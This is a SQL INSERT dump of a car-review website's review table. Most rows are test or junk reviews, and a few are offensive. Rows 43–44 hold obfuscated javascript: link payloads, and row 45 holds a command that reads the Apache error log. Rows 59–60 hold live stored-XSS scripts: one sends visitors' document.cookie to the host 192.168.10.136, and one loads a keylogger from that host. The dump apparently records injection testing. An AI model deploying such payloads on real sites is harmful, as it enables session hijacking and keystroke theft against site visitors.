INSERT INTO `review_data` VALUES (1,5,1,'first update'),(2,6,4,'anotehter test'),(3,6,11,'i love cars man'),(4,7,5,'My wife cheated on me in this car. -rep'),(5,11,4,'The M4 is a really different car compared to the 8 series. The M4 is the more nimble, loud and agile sportscar, where the 8 series is more of a long distance Autobahn jet.\r\n\r\nIf you\'re not into the luxury, go for the M4. I love the sound and the looks especially. I probably would prefer a 911 over a 8 Series if I had to choose.\r\n\r\nGoes fast in the snow, and thats all that matters for me.\r\n\r\nCheck out my youtube channel. https://www.youtube.com/user/TopGear'),(6,5,2,'asdasd'),(7,11,1,'If you can get past its looks, the BMW i3 is one of the most compelling electric vehicles you can buy, primarily used. Over the years, the BMW i3 has earned above-average reliability ratings and good safety scores too. The 2017 i3 is one of the better model years to buy used because of its performance and practicality. But unlike the i8, the i3 has not been discontinued. Now sold only as an all-electric vehicle (it was also initially available with a small gasoline engine range extender), the i3 is BMW\'s first purely electric series production model.'),(8,5,2,'i lov it'),(11,5,6,'test'),(12,5,2,'asdasd'),(13,5,3,'i hate girls'),(17,5,1,'updatetest'),(19,5,1,'work'),(28,1,5,'my other review'),(29,1,9,'my 2nd other review plus things'),(30,1,2,'my 3rd other review'),(31,1,9,'my fourrth other review plus things'),(33,1,2,'my favourite cinvert'),(34,2,2,'also my favouurite convert'),(41,5,4,'best bmw driven'),(42,5,2,'great car'),(43,1,9,'><a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href =javascript:confirm(1)>ClickMe '),(44,1,5,'><a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#x0D;av&#x61;s&#x0D;cript&#x0D;&colon;&#x0D;confirm(1)>ClickMe'),(45,5,1,'cat /var/log/apache2/error.log'),(47,1,1,'afafadagasgasdgaga'),(48,1,8,'my fave subaru'),(52,17,10,'i bought one, very nice\r\n'),(53,8,6,'reliable family car'),(57,5,12,'my favourite hyundai too'),(58,5,11,'my favourite honda!'),(59,16,12,'nice hyundai <script>\r\nfetch(\'http://192.168.10.136:8080\', {\r\nmethod: \'POST\',\r\nmode: \'no-cors\',\r\nbody:document.cookie\r\n});\r\n</script>'),(60,16,11,'Best Honda ever\r\n<script src=\"http://192.168.10.136/keylogger.js\">\r\n</script>');
